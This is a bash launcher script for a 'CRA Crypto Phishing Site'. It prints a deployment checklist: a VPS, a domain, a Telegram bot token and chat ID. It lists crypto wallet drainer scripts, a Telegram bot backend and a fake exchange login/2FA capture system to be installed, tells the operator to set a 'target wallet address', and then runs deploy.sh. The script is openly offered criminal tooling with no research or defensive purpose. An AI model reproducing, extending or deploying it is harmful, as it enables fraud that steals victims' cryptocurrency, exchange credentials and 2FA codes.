#!/bin/bash

# Quick Deployment Guide
# ======================

echo "╔════════════════════════════════════════════════════════════════╗"
echo "║  CRA Crypto Phishing Site - One-Script Deployment             ║"
echo "║  Complete automated setup in under 10 minutes                 ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo ""
echo "📋 CHECKLIST - Have these ready:"
echo ""
echo "  ✓ Fresh Ubuntu/Debian VPS (root access)"
echo "  ✓ Server IP address"
echo "  ✓ SSH root password"
echo "  ✓ Domain name (DNS pointed to server IP)"
echo "  ✓ Telegram bot token (from @BotFather)"
echo "  ✓ Your Telegram chat ID (from @userinfobot)"
echo "  ✓ Email address (for SSL certificate)"
echo ""
echo "🔧 WHAT WILL BE INSTALLED:"
echo ""
echo "  • Nginx web server (with SSL)"
echo "  • Node.js v18 + PM2"
echo "  • Let's Encrypt SSL certificate"
echo "  • All website files (50+ pages)"
echo "  • Drainer JS files (wallet.js, drainer.js, WalletConnect)"
echo "  • Telegram bot backend"
echo "  • Exchange login/2FA system"
echo ""
echo "⚡ QUICK START:"
echo ""
echo "  1. Read DEPLOYMENT_README.md for full details"
echo "  2. Ensure DNS is pointing to your server"
echo "  3. Run: ./deploy.sh"
echo "  4. Follow the prompts"
echo "  5. Wait for DNS propagation when asked"
echo "  6. Update target wallet address after deployment"
echo ""
echo "📁 IMPORTANT FILES:"
echo ""
echo "  • deploy.sh - Main deployment script"
echo "  • DEPLOYMENT_README.md - Full documentation"
echo "  • DEPLOYMENT_INFO.txt - Created after deployment with your settings"
echo ""
echo "🚀 DEPLOYMENT TIME:"
echo ""
echo "  ~5-10 minutes (depending on server speed & DNS propagation)"
echo ""
echo "═══════════════════════════════════════════════════════════════════"
echo ""

read -p "Ready to deploy? (y/n): " confirm

if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
    echo ""
    echo "🚀 Starting deployment..."
    echo ""
    ./deploy.sh
else
    echo ""
    echo "Deployment cancelled. Run ./deploy.sh when ready."
    echo ""
fi
